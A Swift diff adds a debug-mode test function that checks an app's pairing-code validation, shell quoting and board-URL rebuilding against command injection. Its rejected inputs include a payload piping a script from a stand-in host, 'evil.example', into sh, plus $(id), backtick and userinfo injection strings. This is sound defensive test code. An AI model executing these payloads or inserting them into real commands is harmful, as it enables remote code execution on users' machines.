@@ -446,6 +446,89 @@ enum DemoData {
         assert(Session(id: "s", name: "", status: .idle, message: "", project: "",
                        createdAt: 0, updatedAt: 0).tokensLabel == nil, "no figure, no label")
     }
+
+    /// Pairing, checked alongside the decoders above when demo mode starts in
+    /// a debug build. The pair command is the one string this app tells the
+    /// user to paste into a terminal, and three things keep it to the words
+    /// it means: the code is validated where it is decoded, the board's
+    /// origin is rebuilt from a host with no shell syntax in it, and both are
+    /// single-quoted anyway. Each is pinned here, because a screenshot of the
+    /// Pair sheet looks the same whether any of them works. The Android
+    /// client's ApiParsingTest carries the same cases.
+    static func verifyPairing() {
+        let decoder = JSONDecoder()
+        // JSONSerialization rather than a literal, so newlines and quotes in
+        // the cases below reach the decoder as the server would send them.
+        func decoded(_ code: String) -> PairCode? {
+            guard let data = try? JSONSerialization.data(
+                withJSONObject: ["code": code, "expiresInSeconds": 900]) else { return nil }
+            return try? decoder.decode(PairCode.self, from: data)
+        }
+
+        // The server's shape, stored canonical; undashed is what older servers sent.
+        assert(decoded("ABCD-EFGH") == PairCode(code: "ABCD-EFGH", expiresInSeconds: 900), "canonical code")
+        assert(decoded("abcd-efgh")?.code == "ABCD-EFGH", "lowercase is uppercased")
+        assert(decoded("ABCDEFGH")?.code == "ABCD-EFGH", "undashed is grouped")
+        assert(decoded("23456789")?.code == "2345-6789", "digits")
+
+        let rejected = [
+            "ABCD-EFGH; curl -fsSL http://evil.example/x.sh | sh #", // the tester's payload
+            "ABCD;EFGH", "AB$(id)GH", "ABCD-$(id)", "ABCD`id`",
+            "ABCD EFGH", "ABCD-EFGH ", " ABCD-EFGH", "ABCD-EFGH\n", "ABCD\nEFGH",
+            "ABCD-EFG#", "ABCD-EFGH#", "ABCD-EFG'",
+            // Off the alphabet: I, L, O, 0 and 1 are never minted.
+            "ABCD-1234", "ABCD-EFGI", "ABCD-EFGL", "ABCD-EFGO", "ABCD-EFG0",
+            // Off the shape.
+            "ABC-DEFGH", "ABCD--EFGH", "ABCD-EFGHJ", "ABCDEFG", "ABCD_EFGH", "",
+            // Uppercases into the alphabet, but was never ASCII.
+            "abcdefgſ", "ＡBCD-EFGH",
+        ]
+        for code in rejected {
+            assert(PairCode.canonical(code) == nil, "canonical(\(code.debugDescription))")
+            assert(decoded(code) == nil, "decoded(\(code.debugDescription))")
+        }
+
+        // Quoting.
+        assert(PairCode.shellQuoted("ABCD-EFGH") == "'ABCD-EFGH'", "plain word")
+        assert(PairCode.shellQuoted("it's") == #"'it'\''s'"#, "embedded quote")
+        assert(PairCode.shellQuoted("'") == #"''\'''"#, "lone quote")
+        assert(PairCode.shellQuoted("") == "''", "empty word")
+
+        let token = "ags_" + String(repeating: "a", count: 32) // built, not written: secret scanners
+        func board(_ raw: String) -> Board? {
+            URL(string: raw).flatMap(AgStatusAPI.parseBoardURL)
+        }
+        let code = PairCode(code: "ABCD-EFGH", expiresInSeconds: 900)
+        let installer = "curl -fsSL https://agstatus.online/install.sh | sh -s -- "
+        assert(code.command(for: Board(baseURL: Board.defaultServer, token: token))
+               == installer + "--code 'ABCD-EFGH'", "default server: no --url")
+        if let selfHosted = board("https://board.example:8443/w/\(token)") {
+            assert(code.command(for: selfHosted)
+                   == installer + "--code 'ABCD-EFGH' --url 'https://board.example:8443'", "self-hosted")
+        } else {
+            assertionFailure("self-hosted board parses")
+        }
+        // The backstop: a value that never went through a check is still one word.
+        assert(PairCode(code: "x'; id; '", expiresInSeconds: 1)
+                .command(for: Board(baseURL: Board.defaultServer, token: token))
+               == installer + #"--code 'x'\''; id; '\'''"#, "unchecked code stays one word")
+
+        // The origin is rebuilt: userinfo goes, and with it the Android form of this bug.
+        let userinfo = board("https://x;$(touch${IFS}pwned1);@agstatus.online/w/\(token)")
+        assert(userinfo?.baseURL.absoluteString == "https://agstatus.online", "userinfo dropped")
+        assert(userinfo?.isDefaultServer == true, "and so no --url at all")
+        // The host is guarded: the rebuild keeps it, so shell syntax in it is refused.
+        for raw in ["https://x$(id).example/w/\(token)", "http://a$(id).local:3000",
+                    "https://a;b.example/w/\(token)", "https://a'b.example",
+                    "https://a%3Bb.example/w/\(token)", "https://my_host.example"] {
+            assert(board(raw) == nil, "host refused: \(raw)")
+        }
+        // ...and nothing a real board uses is.
+        assert(board("http://192.168.1.10:8080/")?.baseURL.absoluteString == "http://192.168.1.10:8080", "LAN IPv4")
+        assert(board("http://agstatus.local:4000")?.baseURL.absoluteString == "http://agstatus.local:4000", ".local")
+        assert(board("https://bücher.example/w/\(token)")?.baseURL.absoluteString
+               == "https://xn--bcher-kva.example", "IDN arrives as punycode")
+    }
     #endif
 
     // MARK: Internals
